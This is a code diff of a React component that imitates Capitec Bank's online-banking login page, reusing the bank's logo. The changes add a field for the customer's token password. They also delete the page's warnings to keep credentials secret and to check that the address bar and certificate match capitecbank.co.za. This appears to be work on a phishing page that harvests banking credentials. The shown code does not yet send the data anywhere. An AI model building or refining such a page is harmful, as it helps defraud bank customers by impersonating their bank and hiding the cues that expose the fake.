@@ -28,11 +28,18 @@ const Capitec = () => {
           }}
         >
           <div className="logo">
-            <img
-              src="https://direct.capitecbank.co.za/ibank/capitec/images/logos/logo_main.png"
-              alt="Capitec Bank Logo"
-              style={{ width: "200px" }}
-            />
+            <a
+              href="https://www.capitecbank.co.za/"
+              className="banking"
+              target="_blank"
+              rel="noreferrer"
+            >
+              <img
+                src="https://direct.capitecbank.co.za/ibank/capitec/images/logos/logo_main.png"
+                alt="Capitec Bank Logo"
+                style={{ width: "200px" }}
+              />
+            </a>
           </div>
 
           <Stack
@@ -118,7 +125,7 @@ const Capitec = () => {
             >
               <form>
                 <label id="usernameLabel" htmlFor="username">
-                  <span class="username">Account number/username:</span>
+                  <span class="account-number">Account number/username:</span>
                   <input
                     id="username"
                     name="username"
@@ -136,13 +143,33 @@ const Capitec = () => {
                     }}
                   />
                 </label>
-
+                <label id="tokenPasswordLabel" htmlFor="tokenPassword">
+                  <span class="account-number">Token Password:</span>
+                  <input
+                    id="tokenPassword"
+                    name="tokenPassword"
+                    type="text"
+                    value={""}
+                    maxlength="40"
+                    style={{
+                      color: "#383633",
+                      fontFamily: "Flama-Basic",
+                      fontSize: "15px",
+                      height: "25px",
+                      padding: "0px 0px 0px 10px",
+                      border: "1px solid #383633",
+                      background: "#fff",
+                    }}
+                  />
+                </label>
                 <button
                   type="submit"
                   className="capitec-button"
-                  onClick={() => {}}
+                  onClick={(e) => {
+                    e.preventDefault();
+                  }}
                 >
-                  Continue
+                  Submit
                 </button>
               </form>
               <a
@@ -177,17 +204,8 @@ const Capitec = () => {
                   or token passwords by email, SMS or telephone
                 </li>
                 <li>
-                  ALWAYS keep your username, Remote PIN, password
-                  <br />
-                  or token passwords secret
-                </li>
-                <li>
                   NEVER use a link or an attachment in any message to access
                   Remote Banking
-                </li>
-                <li>
-                  ALWAYS check that the website address bar and certificate both
-                  match capitecbank.co.za
                 </li>
                 <li>
                   Check your accounts often and report any suspicious activity
